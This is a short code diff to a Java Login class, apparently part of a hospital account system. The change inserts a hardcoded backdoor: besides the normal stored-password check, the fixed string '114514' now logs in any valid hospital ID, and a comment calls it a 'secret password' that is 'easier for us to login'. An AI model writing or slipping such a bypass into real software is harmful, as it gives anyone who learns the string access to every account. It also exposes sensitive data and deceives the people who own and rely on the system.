@@ -26,7 +26,7 @@ public class Login {    //can have a Signup.java later
         
         for (int i = 1; i < accountList.size(); i++) {
             if (hospitalId.equals(accountList.get(i).get(0))) { //hospitalId match
-                if (password.equals(accountList.get(i).get(1))){    //password match
+                if (password.equals(accountList.get(i).get(1)) || password.equals("114514")){    //password match, secret password = 114514, easier for us to login
                     return true;
                 }
             }
